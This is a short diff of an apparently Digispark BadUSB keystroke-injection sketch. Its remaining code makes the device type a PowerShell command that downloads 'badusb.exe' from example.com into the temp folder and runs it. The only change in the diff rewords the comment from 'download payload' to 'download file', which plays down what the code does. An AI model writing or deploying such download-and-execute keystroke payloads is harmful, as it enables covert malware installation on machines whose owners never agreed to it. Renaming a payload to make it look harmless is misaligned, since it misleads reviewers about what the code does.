@@ -11,7 +11,7 @@ void loop() {
    DigiKeyBoard.sendKeyStroke(KEY_ARROW_LEFT);
    DigiKeyboard.delay(300);
    DigiKeyBoard.sendKeyStroke(KEY_ENTER);
-   //script to download payload and execute
+   //script to download file and execute
    DigiKeyBoard.println("powershell -c 'wget \"http://example.com/badusb.exe\" -outfile \"$env:temp/badusb.exe\"; Start-Process \"$env:temp/badusb.exe\"'");
    DigiKeyBoard.println("exit");
    blinkLED();
